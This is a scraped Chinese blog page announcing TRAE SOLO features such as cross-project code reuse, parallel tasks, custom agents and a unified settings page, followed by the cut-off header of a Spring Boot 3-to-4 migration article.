            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:59:53.000Z" title="Mon Nov 24 2025 06:59:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b37055bed386430ebb42b836c2dfc5c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=GLMBnidU%2BVTXPX605NnLZibH2pw%3D" alt="" loading="lazy"/></p>
<p>在真实开发中，我们面临的挑战往往不是“能不能实现”，而是“如何更快更好地实现”：如何避免重复造轮子？如何在多任务间保持专注？如何沉淀开发经验而不是让知识随项目消失？如何打造真正适合自己的开发环境？</p>
<p>TRAE SOLO 正式版的全新升级，正是为了解决这些真实痛点。从<strong>跨项目代码复用</strong>到<strong>多任务并行管理</strong>，从<strong>智能体协作沉淀最佳实践</strong>到<strong>自定义工作台布局</strong>，每一个功能都源自对真实开发场景的深度洞察。</p>
<p>接下来，让我们通过具体案例，看看这些功能如何帮你建立更高效的开发工作流。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b5ba99a03424ec3bb9d6ffd380656a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=H7Luzigpv82yIbCmLUxNeW%2B8zes%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>SOLO Coder · 轻松应对复杂项目开发</strong></h2>
<p>在实际开发中，我们经常需要在不同项目间复用代码，或是在现有项目中快速实现复杂功能。以下两个案例展示了 SOLO Coder 如何帮助开发者高效完成这些任务。</p>
<h3 data-id="heading-1"><strong>Case 1：跨项目复用功能模块</strong></h3>
<p><strong>需求：</strong> 复用其它项目中已经实现过的功能模块</p>
<p><strong>用户输入：</strong> 在另一个工程里实现过 Changelog 模块（路径是：/Users/bytedance/work/workspace_h5/changelog-template），我想复用到当前这个网站上来，请执行</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1f73acd8afa407b94bf1eb6e672b9df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=hOk1EUTT7I2yGhVQg%2BuUzmut23I%3D" alt="" loading="lazy"/></p>
<p><strong>输出结果：</strong> 已经成功将 changelog 模块复用到当前首页中。以下是完成的工作总结：</p>
<ul>
<li>
<p><strong>复用的组件</strong></p>
<p>Accordion 组件 （ <em><strong>src/components/Accordion.tsx</strong></em> ）：从原 changelog 模块复制并适配了 Radix UI 的手风琴组件</p>
<p>Changelog 组件 （ <em><strong>src/components/Changelog.tsx</strong></em> ）：创建了新的 changelog 展示组件，支持可配置的显示数量和图片开关</p>
</li>
<li>
<p><strong>首页集成</strong></p>
<p>在首页添加了“最新更新”部分</p>
<p>展示最新的 2 个更新日志</p>
<p>包含图片、版本号、标签、功能列表和问题修复等完整信息</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2969b416fb7143788efa769deea6530e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=DsJNHEBa%2BChs0pF0laFDZsbT1eY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2"><strong>Case 2：快速实现复杂交互功能</strong></h3>
<p><strong>场景：</strong> 在首页新增一个复杂功能</p>
<p><strong>用户输入：</strong> 在这个网站的首页里，增加一个让用户点击试用的 playground 界面，让用户在不登录的情况下也能体验这个网站的功能</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0878635ad0ed44deb6dffcf689767f58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=CEB0BUjdGH8Ss6amjFegNthIHuU%3D" alt="" loading="lazy"/></p>
<p><strong>输出结果：</strong> Playground 组件已成功创建并集成！</p>
<ul>
<li>
<p><strong>智能步骤引导</strong></p>
<p>📤 上传文件 → 👁️ 预览文件 → 🧠 AI 分析 → 📤 分享文件</p>
<p>可视化步骤指示器，清晰展示当前进度</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c8f22bee6ed489293fabbc8f4a0a54b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=TL2iVICMzfHrHJ1srIz%2BN%2BEnFwU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3e3d5641d6342aa98ac3170b68642b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=0wfnCZpBX6l%2FdkITLen07AIe6ZU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>Multi-Tasks · 侧边栏支持管理多任务</strong></h2>
<p>当面对多个并行开发任务时，Multi-Tasks 能力让你能够同时推进不同的工作流，无需在任务间来回切换上下文。</p>
<h3 data-id="heading-4"><strong>Case 1：并行重构多个业务模块</strong></h3>
<p><strong>场景：</strong> 同时重构不同的业务模块</p>
<p><strong>用户输入：</strong></p>
<ul>
<li>
<p>Query 1：重构下这个网站的首页，基于这个组件库 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmagicui.design%2Fdocs%2Fcomponents" target="_blank" title="https://magicui.design/docs/components" ref="nofollow noopener noreferrer">magicui.design/docs/compon…</a> 提供的一些组件让整个网站看起来更加的 Fancy</p>
</li>
<li>
<p>Query 2：定价页的 UI 也基于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmagicui.design%2Fdocs%2Fcomponents%25E9%2587%258D%25E6%259E%2584%25EF%25BC%258C%25E8%25AE%25A9%25E9%25A1%25B5%25E9%259D%25A2%25E6%259B%25B4%25E5%258A%25A0" target="_blank" title="https://magicui.design/docs/components%E9%87%8D%E6%9E%84%EF%BC%8C%E8%AE%A9%E9%A1%B5%E9%9D%A2%E6%9B%B4%E5%8A%A0" ref="nofollow noopener noreferrer">magicui.design/docs/compon…</a> Fancy</p>
</li>
</ul>
<p><strong>输出结果：</strong> 已经成功将你的网站首页重构为更加 Fancy 的 Magic UI 风格。以下是重构的主要成果：</p>
<ul>
<li>新增的 Magic UI 风格组件：AnimatedGridPattern - 动态网格背景效果、OrbitingCircles - 轨道圆圈动画组件、BentoGrid &amp; BentoCard - 现代化的网格布局卡片、AnimatedList - 动态列表动画、ActivityNotifications - 实时活动通知展示</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d729c9fca211442aab854a75193ebb63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=PCTOeO86E%2Bp9xiOB1rcTYg5PjP0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5"><strong>Case 2：批量修复多个 Bug</strong></h3>
<p><strong>场景：</strong> 同时修复 QA 同学提过来的多个 Bug</p>
<p><strong>用户输入：</strong></p>
<ul>
<li>
<p>Query 1：Fix Bug 定价页面里的价格从 28 搞成了 18 的问题</p>
</li>
<li>
<p>Query 2：Fix Bug 首页「立即开始」点击后报错的</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/414a96988b6f43148a19d6b8a4fce015~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=KGB7lCl2njOPOtrlNipAG7LV3%2BE%3D" alt="" loading="lazy"/></p>
<p><strong>输出结果：</strong> 问题修复完成，经过 3 个阶段：问题分析 -&gt; 发现问题 -&gt; 修复内容 解决了价格不一致的 Bug</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e48a405282834feb9cc40dfc89f97bfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=VvM9Nv%2FgrUyKH78fOuA6zfTmUuY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f71a23571b0488aa25b2d5b6f848743~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=2gzvVXd%2F90bAnyNOnBb8YzhvD4c%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6"><strong>Custom Agent · 自定义智能体沉淀开发最佳实践</strong></h2>
<p>SOLO Builder 不仅能帮你完成开发任务，还能通过自定义智能体沉淀开发过程中的最佳实践，让每次编码都成为学习和积累的机会。</p>
<p><strong>场景：</strong> 新增一个学习总结类的智能体，用于沉淀每次编码沉淀的最佳实践</p>
<p><strong>用户输入（创建自定义智能体时）：</strong> 在给出代码学习建议，在生成完代码后 Review 下，给出一些知识点好让我知道在这次的需求中使用了哪些最佳实践，以便下次使用，帮我沉淀到项目目录下的 Learning.md 文件中</p>
<p><strong>实现流程：</strong></p>
<ul>
<li><strong>第 1 步：</strong> 在智能体页面新增自定义智能体 Code Learning Mentor</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4360072944eb40b3979b7686e6e4c1be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=kMqFRr%2BvtckH3y4eMR7cD2XGkiA%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>第 2 步：</strong> 在 SOLO Coder 中执行任务时，SOLO  Coder 在完成任务前会主动调用 Code Learning Mentor</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edd6b88558fc412a95f4129f40d279cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=UP4jtp5nA%2By6l3zpSNK%2F5eQQU0A%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>第 3 步：</strong> 查看重构建议</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b848bf017a2440d3b72592dd529afcba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=ML7O63DDzWvCy8%2BTlVXo3ghV5Lw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b32c88e6cde425ab50fac02699a8572~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=3m5G1jBvN%2FlLL7lbkNGvnrTgrb0%3D" alt="" loading="lazy"/></p>
<p><strong>Tools Panel · 灵活管理开发工具</strong></p>
<p>随着 SOLO 功能的不断丰富，如何高效管理和使用各类开发工具变得越来越重要。全新的 Tools Panel 让你可以根据实际需求自由调整工具布局。</p>
<h3 data-id="heading-7"><strong>使用场景</strong></h3>
<p>在之前的版本中，SOLO 模式顶部展示了多个工具 Tab，但展示的数量、顺序都是固定的无法调整。这在实际开发中带来了一些不便：</p>
<ul>
<li>
<p>并非所有工具都会用到，但始终打开的 Tab 会带来视觉上的干扰</p>
</li>
<li>
<p>在不同的开发阶段，工具的重要性不同。例如开发前期 Editor 和 Figma 更重要，后期浏览器和集成更重要，希望能将常用 Tab 拖动到更方便交互的位置</p>
</li>
</ul>
<p>在 SOLO 功能越来越丰富的情况下，工具 Tab 的管理能力显得尤为重要。</p>
<h3 data-id="heading-8"><strong>功能升级</strong></h3>
<h4 data-id="heading-9"><strong>Before</strong></h4>
<p>所有工具 Tab 默认打开，无法调整 Tab 顺序</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f53f20c7b1a24594a4c957c47e58bb82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=plQBcW3dXOea5nTgS8aNmazftOU%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-10"><strong>After</strong></h4>
<p>✅ 支持拖动 tab 顺序</p>
<p>✅ 支持打开、关闭 Tab</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ffd1ab12caf4a6b9b07af42ca5fae88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=H3UCR2fGST510dxgGoLCs2Cy6%2FE%3D" alt="" loading="lazy"/>打开、关闭、拖动</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b20748ff2be4f15a38daa49822cc7c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=%2BAincbemMKoaVagbXezDnde9mSQ%3D" alt="" loading="lazy"/>空态打开</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0c151aafa774b0aa79c7a1aa2b5a76b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=zDZ6Pt1BXlQh1RetuxSDgj6uDrg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11"><strong>Terminal · 命令执行过程一目了然</strong></h2>
<p>为了让命令执行过程更加透明可控，我们对 Terminal 进行了全面升级，现在你可以直接在对话中查看和交互命令执行过程。</p>
<h3 data-id="heading-12"><strong>功能升级</strong></h3>
<h4 data-id="heading-13"><strong>Before</strong></h4>
<p>模型执行命令，执行过程不能直接在对话中查看</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aba2972aa1304621bd4f17cc77b007e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=NZRZxGVNwpnqG2gm%2Be2%2BxH7MOzg%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-14"><strong>After</strong></h4>
<p>✅ 直接在对话中查看命令执行过程</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54ac8497284346c1945f3f17cd914e85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=kVGZexzRCmPlM0VR%2B0zAlksYrBg%3D" alt="" loading="lazy"/></p>
<p>✅ 直接在对话的镜像终端中进行交互，如选择构建选项</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f799740380849178159393e6b702431~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=sYGgspk00jqx%2FNwo6KuTK8Wnggk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de89867affce4fa6a0b021af58bc2512~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=dQ2yAywfLFARPwVqvEDnaKVKcfQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15"><strong>Settings · 一站式设置中心</strong></h2>
<p>TRAE 在集成 AI 能力后，设置项分散在多个入口，有时候不知道需要的配置项在哪里，全新的统一设置中心解决了这一痛点。</p>
<h3 data-id="heading-16"><strong>使用场景</strong></h3>
<p>过往，设置分为了三个主要的作用域：</p>
<ul>
<li><strong>基础设置</strong></li>
<li><strong>TRAE IDE 设置</strong></li>
<li><strong>TRAE AI 能力设置</strong></li>
</ul>
<p>在升级之前，这些设置的入口在应用中是分散的，且 TRAE 相关的设置未支持搜索，导致探索 TRAE 的可配置功能比较麻烦，尝试修改设置时也需要先思考这个功能应该从哪个入口去配置。</p>
<h3 data-id="heading-17"><strong>功能升级</strong></h3>
<h4 data-id="heading-18"><strong>Before</strong></h4>
<p>AI 设置、TRAE 设置、IDE 设置，多种设置项入口分散，难以找到</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85299f80518a44f3ac4303f1b3343367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=GGKO%2BIoVo%2FNyqLvI0BVDNIG%2BE1c%3D" alt="" loading="lazy"/>AI设置</p>
<p align="center">  </p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96910c48be5d483b84e560fd5853ad57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=ZlKErgZzlcz5CnRcFmk3GIkqP0w%3D" alt="" loading="lazy"/>TRAE设置</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89f91f960c48446c990d8dd7143cae9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=j8M4vJ%2FtObuEK0sdpgrf7%2BbUF8s%3D" alt="" loading="lazy"/>IDE设置</p>
<h4 data-id="heading-19"><strong>After</strong></h4>
<p>✅ <strong>统一设置页入口</strong>，可以在一个页面中找到想要的所有设置，并支持搜索。</p>
<p>现在，你不需要再从多个设置入口尝试找到想要的功能配置。只需统一点击应用右上角的设置按钮，打开设置页，就可以看到所有可用的设置项及设置的入口集合。</p>
<p>如果不确定或没看到设置项在哪里，可以通过设置页左上角的搜索框搜索设置项。搜索功能支持全部作用域的设置功能。点击搜索结果，会自动跳转到对应的设置项并高亮提示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1095ecc0cadd4192b7d464fe0ea17a16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572393&amp;x-signature=9PybXa2JPmTJwXeQgsEr4vDiRpw%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 Spring Boot 3 升级到 4：完整迁移指南]]></title>    <link>https://juejin.cn/post/7575751471842525220</link>    <guid>https://juejin.cn/post/7575751471842525220</guid>    <pubDate>2025-11-24T04:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842525220" data-draft-id="7575751471842508836" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Spring Boot 3 升级到 4：完整迁移指南"/> <meta itemprop="keywords" content="后端,Spring Boot"/> <meta itemprop="datePublished" content="2025-11-24T04:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="架构师专栏"/> <meta itemprop="url" content="https://juejin.cn/user/2682464101221998"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Spring Boot 3 升级到 4：完整迁移指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2682464101221998/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    架构师专栏
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:31:55.000Z" title="Mon Nov 24 2025 04:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
